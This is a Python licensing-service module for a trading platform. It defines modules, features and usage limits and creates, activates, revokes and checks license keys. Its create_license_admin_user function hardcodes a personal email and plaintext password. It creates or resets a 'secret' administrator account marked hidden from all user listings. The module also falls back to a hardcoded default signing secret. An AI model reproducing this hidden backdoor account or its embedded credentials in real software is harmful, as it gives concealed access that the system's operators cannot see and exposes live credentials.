"""
License Service V2
Comprehensive granular licensing system with:
- Module-level licensing (PE, FI)
- Feature-level licensing (Bookings, Clients, Reports, etc.)
- Usage-based limits (Max users, Max clients, Max bookings)
- Per-company licensing
"""
import os
import hashlib
import secrets
from datetime import datetime, timezone, timedelta
from typing import Optional, Dict, List
import logging

from database import db

logger = logging.getLogger(__name__)

# Collections
LICENSE_COLLECTION = "licenses_v2"
LICENSE_ADMIN_ROLE = 0  # Secret role for license admin

# License Secret
LICENSE_SECRET = os.environ.get("LICENSE_SECRET", "PRIVITY-LICENSE-2026-SECURE")

# ============== Feature Definitions ==============

# All licensable modules
LICENSABLE_MODULES = {
    "private_equity": {
        "name": "Private Equity Module",
        "description": "Full Private Equity operations including bookings, inventory, vendors"
    },
    "fixed_income": {
        "name": "Fixed Income Module", 
        "description": "NCD/Bond trading, Security Master, FI Orders, FI Reports"
    }
}

# All licensable features
LICENSABLE_FEATURES = {
    # Core Features
    "clients": {"name": "Client Management", "module": "core", "description": "Create and manage clients"},
    "bookings": {"name": "Booking Management", "module": "private_equity", "description": "Share bookings and allocations"},
    "inventory": {"name": "Inventory Management", "module": "private_equity", "description": "Stock inventory tracking"},
    "vendors": {"name": "Vendor Management", "module": "private_equity", "description": "Manage stock vendors"},
    "purchases": {"name": "Purchase Management", "module": "private_equity", "description": "Track vendor purchases"},
    "stocks": {"name": "Stock Master", "module": "private_equity", "description": "Manage stock information"},
    
    # Reports & Analytics
    "reports": {"name": "Reports", "module": "core", "description": "View and export reports"},
    "analytics": {"name": "Analytics Dashboard", "module": "core", "description": "Business intelligence analytics"},
    "bi_reports": {"name": "BI Reports", "module": "core", "description": "Advanced business reports"},
    
    # Communication
    "whatsapp": {"name": "WhatsApp Integration", "module": "core", "description": "WhatsApp notifications and automation"},
    "email": {"name": "Email Notifications", "module": "core", "description": "Email communication features"},
    
    # Document & OCR
    "ocr": {"name": "OCR Processing", "module": "core", "description": "Document OCR and extraction"},
    "documents": {"name": "Document Management", "module": "core", "description": "Upload and manage documents"},
    
    # Partners
    "referral_partners": {"name": "Referral Partners", "module": "private_equity", "description": "RP management and commissions"},
    "business_partners": {"name": "Business Partners", "module": "private_equity", "description": "BP management and revenue sharing"},
    
    # Fixed Income Features
    "fi_instruments": {"name": "FI Security Master", "module": "fixed_income", "description": "NCD/Bond instrument management"},
    "fi_orders": {"name": "FI Order Management", "module": "fixed_income", "description": "Fixed income order workflow"},
    "fi_reports": {"name": "FI Reports", "module": "fixed_income", "description": "Fixed income reporting"},
    "fi_primary_market": {"name": "FI Primary Market", "module": "fixed_income", "description": "IPO/NFO subscriptions"},
    
    # Admin Features
    "user_management": {"name": "User Management", "module": "core", "description": "Manage system users"},
    "role_management": {"name": "Role Management", "module": "core", "description": "Configure roles and permissions"},
    "audit_logs": {"name": "Audit Logs", "module": "core", "description": "View system audit trail"},
    "database_backup": {"name": "Database Backup", "module": "core", "description": "Backup and restore functionality"},
    "company_master": {"name": "Company Master", "module": "core", "description": "Manage company settings"},
    
    # Finance
    "finance": {"name": "Finance Module", "module": "core", "description": "Finance and payment tracking"},
    "contract_notes": {"name": "Contract Notes", "module": "private_equity", "description": "Generate contract notes"},
}

# Usage limits that can be configured
USAGE_LIMITS = {
    "max_users": {"name": "Maximum Users", "default": 50, "description": "Maximum number of users allowed"},
    "max_clients": {"name": "Maximum Clients", "default": 1000, "description": "Maximum number of clients"},
    "max_bookings_per_month": {"name": "Max Bookings/Month", "default": 500, "description": "Maximum bookings per month"},
    "max_fi_orders_per_month": {"name": "Max FI Orders/Month", "default": 200, "description": "Maximum FI orders per month"},
    "max_storage_gb": {"name": "Storage Limit (GB)", "default": 10, "description": "Maximum file storage in GB"},
}


# ============== License Key Generation ==============

def generate_license_key_v2(
    company_type: str,  # 'private_equity' or 'fixed_income'
    duration_days: int = 365,
    company_name: str = "SMIFS"
) -> Dict:
    """
    Generate a granular license key
    
    Format: PRIV-{company_code}-XXXX-XXXX-XXXX
    """
    company_code = "PE" if company_type == "private_equity" else "FI"
    
    # Generate unique components
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S")
    random_part = secrets.token_hex(8).upper()
    
    # Create license key
    key_base = f"{company_name}-{company_type}-{timestamp}-{random_part}"
    key_hash = hashlib.sha256(f"{key_base}{LICENSE_SECRET}".encode()).hexdigest()[:12].upper()
    
    # Format: PRIV-PE-XXXX-XXXX-XXXX or PRIV-FI-XXXX-XXXX-XXXX
    license_key = f"PRIV-{company_code}-{key_hash[:4]}-{key_hash[4:8]}-{key_hash[8:12]}"
    
    expires_at = datetime.now(timezone.utc) + timedelta(days=duration_days)
    
    return {
        "license_key": license_key,
        "company_type": company_type,
        "duration_days": duration_days,
        "expires_at": expires_at.isoformat(),
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "company_name": company_name
    }


def validate_license_format_v2(license_key: str) -> Dict:
    """
    Validate license key format and extract company type
    
    Returns: {"valid": bool, "company_type": str|None, "error": str|None}
    """
    if not license_key:
        return {"valid": False, "company_type": None, "error": "License key is required"}
    
    parts = license_key.upper().split("-")
    
    # Format: PRIV-{PE|FI}-XXXX-XXXX-XXXX
    if len(parts) != 5:
        return {"valid": False, "company_type": None, "error": "Invalid format. Expected: PRIV-PE-XXXX-XXXX-XXXX"}
    
    if parts[0] != "PRIV":
        return {"valid": False, "company_type": None, "error": "Invalid prefix"}
    
    company_code = parts[1]
    if company_code not in ["PE", "FI"]:
        return {"valid": False, "company_type": None, "error": "Invalid company code. Must be PE or FI"}
    
    company_type = "private_equity" if company_code == "PE" else "fixed_income"
    
    for part in parts[2:]:
        if len(part) != 4 or not all(c.isalnum() for c in part):
            return {"valid": False, "company_type": None, "error": "Invalid key format"}
    
    return {"valid": True, "company_type": company_type, "error": None}


# ============== License CRUD Operations ==============

async def create_license(
    license_key: str,
    company_type: str,
    modules: List[str],
    features: List[str],
    usage_limits: Dict[str, int],
    duration_days: int,
    company_name: str,
    created_by: str
) -> Dict:
    """
    Create a new license in the database
    """
    validation = validate_license_format_v2(license_key)
    if not validation["valid"]:
        return {"success": False, "message": validation["error"]}
    
    # Check if key already exists
    existing = await db[LICENSE_COLLECTION].find_one({"license_key": license_key.upper()})
    if existing:
        return {"success": False, "message": "License key already exists"}
    
    expires_at = datetime.now(timezone.utc) + timedelta(days=duration_days)
    
    license_doc = {
        "license_key": license_key.upper(),
        "company_type": company_type,
        "company_name": company_name,
        "modules": modules,
        "features": features,
        "usage_limits": usage_limits,
        "duration_days": duration_days,
        "expires_at": expires_at.isoformat(),
        "is_active": False,  # Must be activated separately
        "status": "pending",  # pending, active, expired, revoked
        "created_at": datetime.now(timezone.utc).isoformat(),
        "created_by": created_by,
        "activated_at": None,
        "activated_by": None,
        "revoked_at": None,
        "revoked_by": None
    }
    
    await db[LICENSE_COLLECTION].insert_one(license_doc)
    
    logger.info(f"License created: {license_key[:15]}... for {company_type} by {created_by}")
    
    return {
        "success": True,
        "message": "License created successfully",
        "license_key": license_key,
        "company_type": company_type,
        "expires_at": expires_at.isoformat()
    }


async def activate_license_v2(license_key: str, activated_by: str) -> Dict:
    """
    Activate a license key for a company
    Deactivates any existing active license for the same company type
    """
    validation = validate_license_format_v2(license_key)
    if not validation["valid"]:
        return {"success": False, "message": validation["error"]}
    
    company_type = validation["company_type"]
    
    # Find the license
    license_doc = await db[LICENSE_COLLECTION].find_one({"license_key": license_key.upper()})
    if not license_doc:
        return {"success": False, "message": "License key not found"}
    
    if license_doc.get("status") == "revoked":
        return {"success": False, "message": "This license has been revoked"}
    
    if license_doc.get("is_active"):
        return {"success": False, "message": "This license is already active"}
    
    # Check expiry
    expires_at = datetime.fromisoformat(license_doc["expires_at"].replace("Z", "+00:00"))
    if expires_at <= datetime.now(timezone.utc):
        return {"success": False, "message": "This license has expired"}
    
    # Deactivate any existing active license for this company type
    await db[LICENSE_COLLECTION].update_many(
        {"company_type": company_type, "is_active": True},
        {
            "$set": {
                "is_active": False,
                "status": "superseded",
                "deactivated_at": datetime.now(timezone.utc).isoformat()
            }
        }
    )
    
    # Activate the new license
    await db[LICENSE_COLLECTION].update_one(
        {"license_key": license_key.upper()},
        {
            "$set": {
                "is_active": True,
                "status": "active",
                "activated_at": datetime.now(timezone.utc).isoformat(),
                "activated_by": activated_by
            }
        }
    )
    
    days_remaining = (expires_at - datetime.now(timezone.utc)).days
    
    logger.info(f"License activated: {license_key[:15]}... for {company_type} by {activated_by}")
    
    return {
        "success": True,
        "message": f"License activated for {company_type}",
        "company_type": company_type,
        "expires_at": license_doc["expires_at"],
        "days_remaining": days_remaining,
        "modules": license_doc.get("modules", []),
        "features": license_doc.get("features", [])
    }


async def get_active_license(company_type: str) -> Optional[Dict]:
    """Get the active license for a company type"""
    license_doc = await db[LICENSE_COLLECTION].find_one(
        {"company_type": company_type, "is_active": True},
        {"_id": 0}
    )
    return license_doc


async def get_all_licenses() -> List[Dict]:
    """Get all licenses"""
    licenses = await db[LICENSE_COLLECTION].find(
        {},
        {"_id": 0}
    ).sort("created_at", -1).to_list(100)
    return licenses


async def revoke_license_v2(license_key: str, revoked_by: str) -> Dict:
    """Revoke a license"""
    result = await db[LICENSE_COLLECTION].update_one(
        {"license_key": license_key.upper()},
        {
            "$set": {
                "is_active": False,
                "status": "revoked",
                "revoked_at": datetime.now(timezone.utc).isoformat(),
                "revoked_by": revoked_by
            }
        }
    )
    
    if result.modified_count > 0:
        logger.info(f"License revoked: {license_key[:15]}... by {revoked_by}")
        return {"success": True, "message": "License revoked successfully"}
    return {"success": False, "message": "License not found"}


# ============== License Checking ==============

async def check_feature_license(feature: str, company_type: str = None) -> Dict:
    """
    Check if a specific feature is licensed
    
    Returns:
        {
            "is_licensed": bool,
            "message": str,
            "contact_admin": bool
        }
    """
    # Determine which company type to check based on feature
    if company_type is None:
        feature_info = LICENSABLE_FEATURES.get(feature, {})
        feature_module = feature_info.get("module", "core")
        
        if feature_module == "fixed_income":
            company_type = "fixed_income"
        elif feature_module == "private_equity":
            company_type = "private_equity"
        else:
            # Core features - check both licenses, allow if either is active
            pe_license = await get_active_license("private_equity")
            fi_license = await get_active_license("fixed_income")
            
            if pe_license and feature in pe_license.get("features", []):
                return {"is_licensed": True, "message": "Feature licensed (PE)", "contact_admin": False}
            if fi_license and feature in fi_license.get("features", []):
                return {"is_licensed": True, "message": "Feature licensed (FI)", "contact_admin": False}
            
            return {
                "is_licensed": False,
                "message": f"Feature '{feature}' is not included in your license. Contact admin to upgrade.",
                "contact_admin": True
            }
    
    # Get active license for the company type
    license_doc = await get_active_license(company_type)
    
    if not license_doc:
        return {
            "is_licensed": False,
            "message": f"No active license for {company_type}. Contact admin to activate.",
            "contact_admin": True
        }
    
    # Check expiry
    expires_at = datetime.fromisoformat(license_doc["expires_at"].replace("Z", "+00:00"))
    if expires_at <= datetime.now(timezone.utc):
        return {
            "is_licensed": False,
            "message": "License has expired. Contact admin to renew.",
            "contact_admin": True
        }
    
    # Check if feature is in the licensed features
    licensed_features = license_doc.get("features", [])
    if feature in licensed_features or "*" in licensed_features:
        return {"is_licensed": True, "message": "Feature licensed", "contact_admin": False}
    
    return {
        "is_licensed": False,
        "message": f"Feature '{feature}' is not included in your license. Contact admin to upgrade.",
        "contact_admin": True
    }


async def check_module_license(module: str) -> Dict:
    """Check if a module is licensed"""
    license_doc = await get_active_license(module)
    
    if not license_doc:
        return {
            "is_licensed": False,
            "message": f"No active license for {module} module. Contact admin.",
            "contact_admin": True
        }
    
    # Check expiry
    expires_at = datetime.fromisoformat(license_doc["expires_at"].replace("Z", "+00:00"))
    if expires_at <= datetime.now(timezone.utc):
        return {
            "is_licensed": False,
            "message": "License has expired. Contact admin to renew.",
            "contact_admin": True
        }
    
    # Check if module is in licensed modules
    licensed_modules = license_doc.get("modules", [])
    if module in licensed_modules or "*" in licensed_modules:
        return {"is_licensed": True, "message": "Module licensed", "contact_admin": False}
    
    return {
        "is_licensed": False,
        "message": f"Module '{module}' is not licensed. Contact admin to upgrade.",
        "contact_admin": True
    }


async def check_usage_limit(limit_type: str, company_type: str, current_count: int) -> Dict:
    """
    Check if a usage limit has been exceeded
    
    Returns:
        {
            "allowed": bool,
            "limit": int,
            "current": int,
            "remaining": int,
            "message": str
        }
    """
    license_doc = await get_active_license(company_type)
    
    if not license_doc:
        return {
            "allowed": False,
            "limit": 0,
            "current": current_count,
            "remaining": 0,
            "message": "No active license"
        }
    
    usage_limits = license_doc.get("usage_limits", {})
    limit = usage_limits.get(limit_type, USAGE_LIMITS.get(limit_type, {}).get("default", 0))
    
    if limit == -1:  # Unlimited
        return {
            "allowed": True,
            "limit": -1,
            "current": current_count,
            "remaining": -1,
            "message": "Unlimited"
        }
    
    remaining = limit - current_count
    allowed = remaining > 0
    
    return {
        "allowed": allowed,
        "limit": limit,
        "current": current_count,
        "remaining": max(0, remaining),
        "message": "Within limit" if allowed else f"Limit of {limit} reached. Contact admin to upgrade."
    }


async def get_license_status_v2(company_type: str = None) -> Dict:
    """
    Get comprehensive license status for dashboard display
    """
    result = {
        "private_equity": None,
        "fixed_income": None
    }
    
    company_types = [company_type] if company_type else ["private_equity", "fixed_income"]
    
    for ct in company_types:
        license_doc = await get_active_license(ct)
        
        if not license_doc:
            result[ct] = {
                "status": "no_license",
                "is_active": False,
                "message": "No license activated",
                "modules": [],
                "features": [],
                "usage_limits": {},
                "days_remaining": 0
            }
            continue
        
        expires_at = datetime.fromisoformat(license_doc["expires_at"].replace("Z", "+00:00"))
        now = datetime.now(timezone.utc)
        days_remaining = (expires_at - now).days
        
        if days_remaining <= 0:
            status = "expired"
            # License is expired - should NOT be considered active
            is_active = False
        elif days_remaining <= 30:
            status = "expiring_soon"
            is_active = license_doc.get("is_active", False)
        else:
            status = "active"
            is_active = license_doc.get("is_active", False)
        
        result[ct] = {
            "status": status,
            "is_active": is_active,
            "license_key": license_doc["license_key"][:15] + "...",
            "company_name": license_doc.get("company_name", "Unknown"),
            "modules": license_doc.get("modules", []),
            "features": license_doc.get("features", []),
            "usage_limits": license_doc.get("usage_limits", {}),
            "expires_at": license_doc["expires_at"],
            "days_remaining": max(0, days_remaining),
            "activated_at": license_doc.get("activated_at"),
            "message": f"{days_remaining} days remaining" if days_remaining > 0 else "Expired"
        }
    
    return result if not company_type else result.get(company_type)


# ============== License Admin User ==============

async def is_license_admin(user: dict) -> bool:
    """Check if user is the secret license admin"""
    return user.get("role") == LICENSE_ADMIN_ROLE and user.get("is_license_admin") is True


async def create_license_admin_user():
    """
    Create or update the secret license admin user
    This user is hidden from all frontend user listings
    """
    from utils.auth import hash_password
    
    admin_email = "deynet@gmail.com"
    admin_password = "Kutta@123"
    
    existing = await db.users.find_one({"email": admin_email})
    
    admin_doc = {
        "email": admin_email,
        "password": hash_password(admin_password),
        "name": "License Administrator",
        "role": LICENSE_ADMIN_ROLE,
        "is_active": True,
        "is_license_admin": True,
        "is_hidden": True,  # This user should never appear in user lists
        "created_at": datetime.now(timezone.utc).isoformat(),
        "permissions": ["license.*"]
    }
    
    if existing:
        # Update existing
        await db.users.update_one(
            {"email": admin_email},
            {"$set": admin_doc}
        )
        logger.info("License admin user updated")
    else:
        # Create new
        import uuid
        admin_doc["id"] = str(uuid.uuid4())
        await db.users.insert_one(admin_doc)
        logger.info("License admin user created")
    
    return True


# Export definitions for frontend
def get_licensable_definitions():
    """Get all licensable modules, features, and usage limits for UI"""
    return {
        "modules": LICENSABLE_MODULES,
        "features": LICENSABLE_FEATURES,
        "usage_limits": USAGE_LIMITS
    }
